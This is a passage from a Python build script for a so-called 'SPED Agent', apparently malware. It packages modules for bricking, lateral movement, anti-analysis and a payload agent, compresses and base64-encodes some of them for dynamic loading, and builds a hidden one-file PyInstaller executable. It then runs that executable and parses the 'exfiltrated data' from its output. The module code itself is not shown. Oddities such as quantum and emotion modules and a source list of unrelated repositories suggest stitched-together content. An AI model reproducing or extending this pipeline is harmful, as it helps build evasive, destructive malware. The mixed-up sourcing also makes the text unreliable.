    "bricking_module.py": BRICKING_MODULE_CODE,
    "modular_loader.py": MODULAR_LOADER_CODE, # Renamed from _Template
    "lateral_movement.py": LATERAL_MOVEMENT_CODE,
    "anti_analysis.py": ANTI_ANALYSIS_CODE,
    "payload_agent.py": PAYLOAD_AGENT_CODE, # This is the core agent
    "main_entry.py": MAIN_ENTRY_SCRIPT_CODE # This is what PyInstaller targets as the entry point
}

# Encode modular payloads for dynamic loading
# These encoded strings will be passed as part of LOAD_MODULE commands to the agent.
ENCODED_LATERAL_MOVEMENT_CODE = base64.b64encode(zlib.compress(LATERAL_MOVEMENT_CODE.encode('utf-8'))).decode('utf-8')
ENCODED_ANTI_ANALYSIS_CODE = base64.b64encode(zlib.compress(ANTI_ANALYSIS_CODE.encode('utf-8'))).decode('utf-8')
ENCODED_BRICKING_MODULE_CODE = base64.b64encode(zlib.compress(BRICKING_MODULE_CODE.encode('utf-8'))).decode('utf-8')

# ------------------------------------------------------------------------------
# PHASE 2: Orchestration and Main Agent Logic (Handled by payload_agent.py)
# ------------------------------------------------------------------------------
print("PHASE 2: SPED Agent core logic defined in payload_agent.py, using shared_context for inter-module communication.")

# ------------------------------------------------------------------------------
# PHASE 3: Build Standalone Executable with PyInstaller
# ------------------------------------------------------------------------------

print("\nPHASE 3: Building standalone executable with PyInstaller...")

# Use os.path.abspath for robustness
BUILD_DIR = os.path.abspath("sped_agent_build")

# Clean up previous build directory if it exists
if os.path.exists(BUILD_DIR):
    shutil.rmtree(BUILD_DIR)
os.makedirs(BUILD_DIR)

# Write all module files to the temporary build directory
for filename, code_content in MODULES.items():
    file_path = os.path.join(BUILD_DIR, filename)
    with open(file_path, "w") as f:
        f.write(code_content)
    print(f"Wrote {filename} to {BUILD_DIR}/")

# Construct the PyInstaller command
pyinstaller_command = [
    "pyinstaller",
    "--onefile",
    "--noconsole",
    "--distpath", "dist",
    "--workpath", "build",
    "--specpath", ".",
    "--clean",
    "--add-data", f"{BUILD_DIR}/quantum_forking.py:.",
    "--add-data", f"{BUILD_DIR}/emotional_feedback.py:.",
    "--add-data", f"{BUILD_DIR}/sped_narrative.py:.",
    "--add-data", f"{BUILD_DIR}/shared_context.py:.",
    "--add-data", f"{BUILD_DIR}/bricking_module.py:.",
    "--add-data", f"{BUILD_DIR}/modular_loader.py:.",
    "--add-data", f"{BUILD_DIR}/lateral_movement.py:.",
    "--add-data", f"{BUILD_DIR}/anti_analysis.py:.",
    "--add-data", f"{BUILD_DIR}/payload_agent.py:.",
    "--hidden-import", "qiskit",
    "--hidden-import", "textblob",
    os.path.join(BUILD_DIR, "main_entry.py") # The main script to bundle
]

print(f"Running PyInstaller command: {' '.join(pyinstaller_command)}")
try:
    # Execute PyInstaller and capture its output
    pyinstaller_process = subprocess.run(pyinstaller_command, capture_output=True, text=True, check=True)
    print("PyInstaller Output (stdout):\n", pyinstaller_process.stdout)
    print("PyInstaller Output (stderr):\n", pyinstaller_process.stderr)
    print("PyInstaller build completed successfully!")
except subprocess.CalledProcessError as e:
    print(f"PyInstaller build failed! Error:\n{e.stderr}")
    sys.exit(1)
except Exception as e:
    print(f"An unexpected error occurred during PyInstaller build: {e}")
    sys.exit(1)

# Clean up the temporary build directory after PyInstaller finishes
# shutil.rmtree(BUILD_DIR) # Uncomment to remove the build directory
# print(f"Cleaned up temporary build directory: {BUILD_DIR}")

# ------------------------------------------------------------------------------
# PHASE 4: Execution Simulation and Testing
# ------------------------------------------------------------------------------

print("\nPHASE 4: Simulating SPED Agent execution...")

# Determine the path to the generated executable using os.path.join for portability
executable_path = os.path.join("dist", "main_entry")
if sys.platform == "win32":
    executable_path += ".exe" # Add .exe suffix for Windows

if not os.path.exists(executable_path):
    print(f"Error: Executable not found at {executable_path}. PyInstaller might have failed or outputted elsewhere.")
    sys.exit(1)

print(f"Executing SPED Agent from: {executable_path}")

try:
    # Run the executable in a subprocess.
    print("Agent running in background for 15 seconds (simulated). This allows it to generate logs and exfil data...")
    agent_process = subprocess.Popen([executable_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Allow the agent to run for a fixed duration.
    time.sleep(15) 
    
    # Terminate the agent process and retrieve its output
    agent_process.terminate()
    stdout, stderr = agent_process.communicate(timeout=5) # Wait for it to terminate and get output

    print("\n--- SPED Agent Simulated Output (stdout) ---")
    print(stdout)
    print("\n--- SPED Agent Simulated Output (stderr) ---")
    print(stderr)

    # Parse exfiltrated data and internal logs from the captured stdout.
    exfil_data_start_marker = "EXFILTRATED_DATA_START"
    exfil_data_end_marker = "EXFILTRATED_DATA_END"
    
    exfil_chunks = []
    current_exfil_chunk_lines = []
    in_exfil_block = False

    for line in stdout.splitlines():
        if exfil_data_start_marker in line:
            in_exfil_block = True
            current_exfil_chunk_lines = [] # Reset for new chunk
            continue
        if exfil_data_end_marker in line:
            in_exfil_block = False
            exfil_chunks.append("".join(current_exfil_chunk_lines))
            continue
        if in_exfil_block:
            current_exfil_chunk_lines.append(line + "\n")

    print("\n--- Parsed Exfiltrated Data ---")
    if exfil_chunks:
        for i, chunk_content in enumerate(exfil_chunks):
            print(f"Exfil Chunk {i+1}:")
            decoded_logs = []
            for encoded_log_line in chunk_content.splitlines():
                if encoded_log_line.strip():
                    try:
                        decoded_log = base64.b64decode(encoded_log_line.strip()).decode('utf-8')
                        decoded_logs.append(decoded_log)
                    except Exception as e:
                        decoded_logs.append(f"ERROR_DECODING_LOG: {encoded_log_line} ({e})")
            print("\n".join(decoded_logs))
    else:
        print("No exfiltrated data found.")

    print("\n--- SPED Agent Simulation Complete ---")

except subprocess.TimeoutExpired:
    print("Agent process timed out. Terminating...")
    agent_process.kill()
    stdout, stderr = agent_process.communicate()
    print("\n--- SPED Agent Simulated Output (stdout) ---")
    print(stdout.decode())
    print("\n--- SPED Agent Simulated Output (stderr) ---")
    print(stderr.decode())
    print("SPED Agent Simulation Terminated due to timeout.")
except Exception as e:
    print(f"Error during agent execution simulation: {e}")
    sys.exit(1)

# Final cleanup of PyInstaller artifacts (dist and build directories)
# shutil.rmtree("dist", ignore_errors=True) # Uncomment to remove the 'dist' directory
# shutil.rmtree("build", ignore_errors=True) # Uncomment to remove the 'build' directory
# print("Cleaned up PyInstaller dist and build directories.")


Sources
1. https://github.com/acnoel/QISErepo-
2. https://github.com/iamnswamyg/qwli
3. https://github.com/aleksandra0014/algorithms_lab
